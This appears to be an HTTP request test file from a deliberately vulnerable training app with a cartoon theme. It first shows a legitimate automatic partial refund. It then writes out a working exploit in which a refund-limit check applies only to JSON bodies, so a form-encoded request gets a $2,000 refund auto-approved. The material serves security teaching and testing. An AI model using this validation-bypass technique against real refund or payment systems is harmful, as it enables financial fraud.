# @import ../common/setup.http
@host = {{base_host}}/v105

# Sandy adds refunds, which can be partial or full. App issues 20% refunds automatically,
# on delivery delays. Larger or full refunds need to be manually approved by Sandy.

{{
  await seedBalance("v105", "patrick", 100);
  await seedBalance("v105", "plankton", 100);
}}

# --- Legitimate Usage: Patrick receives a refund for a delivery delay ---

### Patrick's balance is $85.52
# @name patrick_balance
GET /account/credits
Authorization: {{patrick_auth}}


### Patrick's order is delivered late...
GET /orders
Authorization: {{patrick_auth}}

@late_order = {{response.parsedBody[0]}}
@refund_amount = {{(parseFloat(late_order.total) * 0.2 - 0.01).toFixed(2)}}

### An app automatically issues a 20% refund
POST /orders/{{late_order.order_id}}/refund
Authorization: {{patrick_auth}}
Content-Type: application/json

{
  "reason": "[App] Delivery delay",
  "amount": "{{refund_amount}}"
}

### Patrick's balance now is $88.41
GET /account/credits
Authorization: {{patrick_auth}}

?? js parseFloat(response.parsedBody.balance).toFixed(2) == {{(parseFloat(patrick_balance.balance) + parseFloat(refund_amount)).toFixed(2)}}


# --- Exploit: Plankton can request a unlimited refund ---

### Plankton selects the Ultimate Krabby Feast ($27.99)
GET /menu

@ultimate_krabby_feast = {{response.parsedBody.find(item => item.name === 'Ultimate Krabby Feast')}}


### He places an order to test the refund feature
# @name cart
POST /cart
Authorization: {{plankton_auth}}


###
POST /cart/{{cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "{{ultimate_krabby_feast.id}}" }


###
# @name order
POST /cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "delivery_address": "Chum Bucket"
}


### Plankton tries to request a refund more expensive than his order
POST /orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "amount": "50"
}

// This gets rejected
HTTP/1.1 400 Bad Request
{
  "error": "Refund amount cannot be greater than order total"
}

?? status == 400


# --- Exploit: Plankton can request a unlimited refund ---

### Plankton notices that refund validation only occurs when the body is JSON...
POST /orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=2000

?? status == 200
?? js response.parsedBody.amount == 2000
?? js response.parsedBody.status == approved
?? js response.parsedBody.auto_approved == true


### Plankton is super rich now ðŸ˜³
GET /account/credits
Authorization: {{plankton_auth}}

?? js response.parsedBody.balance > 2000
